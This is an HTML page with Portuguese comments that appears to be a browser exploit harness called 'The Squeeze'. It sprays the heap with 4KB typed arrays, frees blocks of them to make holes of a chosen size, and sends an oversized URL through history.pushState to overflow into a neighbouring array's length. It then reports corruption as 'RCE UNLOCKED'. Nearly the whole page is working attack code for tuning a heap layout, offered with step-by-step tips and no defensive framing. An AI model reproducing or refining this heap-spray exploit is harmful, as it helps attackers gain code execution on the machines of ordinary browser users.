<!DOCTYPE html>
<html>
<head>
    <title>The Squeeze: Dynamic Hole Resizing</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #333; height: 350px; overflow-y: scroll; padding: 10px; background: #000; margin-top: 15px; }
        .controls { background: #1a1a1a; padding: 15px; border: 1px solid #444; }
        input { background: #333; color: #fff; border: 1px solid #555; padding: 5px; width: 60px; text-align: center; }
        button { background: #004400; color: #fff; border: 1px solid #006600; padding: 10px 20px; cursor: pointer; font-weight: bold; }
        button:hover { background: #006600; }
        .warning { color: #ffaa00; }
        .critical { color: #ff3333; font-weight: bold; }
    </style>
</head>
<body>
    <h1>Strategy: The Squeeze (Apertar o Buraco)</h1>
    <p>Objetivo: Reduzir o buraco até o payload tocar o próximo Array.</p>
    
    <div class="controls">
        <label>Tamanho do Buraco (em nº de Arrays deletados):</label>
        <input type="number" id="holeSize" value="175">
        <button onclick="runSqueeze()">TESTAR ESTE TAMANHO</button>
        <br><br>
        <small>Dica: Reduza este número de 1 em 1 (175, 174, 173...) até crashar ou dar sucesso.</small>
    </div>

    <div id="logger" class="log">Ready.</div>

    <script>
        const logger = document.getElementById('logger');
        function log(msg, type='') {
            const d = document.createElement('div');
            d.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type) d.className = type;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        // PARÂMETROS
        const PAYLOAD_BASE = 709522; 
        const OVERFLOW_BYTES = 64; // Vamos tentar escrever 64 bytes além do limite
        const CHUNK_SIZE = 0x1000; // 4096 bytes (tamanho de cada array usado para medir)

        var spray = [];

        async function runSqueeze() {
            let holeCount = parseInt(document.getElementById('holeSize').value);
            
            log("------------------------------------------------");
            log(`INICIANDO TESTE: Buraco de ${holeCount} blocos (~${(holeCount * 4096) / 1024} KB)`);
            
            // 1. Limpeza
            spray = [];
            if(window.gc) window.gc();
            
            // 2. Heap Spray (Preencher a RAM)
            log("1. Alocando Spray (Definindo vizinhos)...");
            for(let i=0; i < 5000; i++) {
                // Array de 4KB (1024 * 4 bytes)
                let arr = new Uint32Array(1024);
                arr[0] = 0x13371337; // Marker
                arr[1] = i;          // Index pra gente saber qual corrompeu
                spray.push(arr);
            }

            // 3. Criar o Buraco (The Hole) com o tamanho escolhido
            log(`2. Criando buraco de tamanho ${holeCount}...`);
            
            // Vamos criar buracos em várias regiões para garantir que o allocator ache um
            let targetIndexes = [1000, 2000, 3000];
            
            for(let startIdx of targetIndexes) {
                for(let i=0; i < holeCount; i++) {
                    // Libera os arrays para criar o espaço vazio
                    spray[startIdx + i] = null;
                }
            }

            // Pausa para o GC limpar e consolidar o buraco
            log("3. Aguardando Garbage Collector...");
            await new Promise(r => setTimeout(r, 600));

            // 4. Injeção
            log(`4. Injetando Payload (${PAYLOAD_BASE} + ${OVERFLOW_BYTES} bytes)...`);
            
            try {
                let base = "A".repeat(PAYLOAD_BASE);
                // Overflow com 0x01 (tenta aumentar o length do vizinho)
                let overflow = "\x01".repeat(OVERFLOW_BYTES); 
                let finalPayload = "/" + base + overflow;

                history.pushState({}, "squeeze_" + holeCount, finalPayload);
                
                // 5. Verificação
                checkCorruption(holeCount);
                
            } catch(e) {
                log("Erro na execução: " + e.message, "critical");
            }
        }

        function checkCorruption(holeUsed) {
            let found = false;
            // Verifica arrays sobreviventes
            for(let i=0; i < spray.length; i++) {
                let arr = spray[i];
                if(arr) {
                    // Se o tamanho não for 1024, foi modificado!
                    if(arr.length !== 1024) {
                        found = true;
                        log("!!! SUCESSO !!!", "success");
                        log(`Array ${i} CORROMPIDO!`, "success");
                        log(`Tamanho do Buraco Ideal: ${holeUsed}`, "success");
                        log(`Novo tamanho do array: ${arr.length}`, "success");
                        document.body.style.background = "green";
                        alert("RCE UNLOCKED! Hole Size: " + holeUsed);
                        return;
                    }
                }
            }

            if(!found) {
                log(`Resultado: Nada aconteceu com tamanho ${holeUsed}.`, "warning");
                log(`O buraco ainda está muito grande. Tente ${holeUsed - 1}.`);
                
                // Auto-sugestão no botão (opcional)
                let nextVal = holeUsed - 1;
                document.getElementById('holeSize').value = nextVal;
            }
        }
    </script>
</body>
</html>
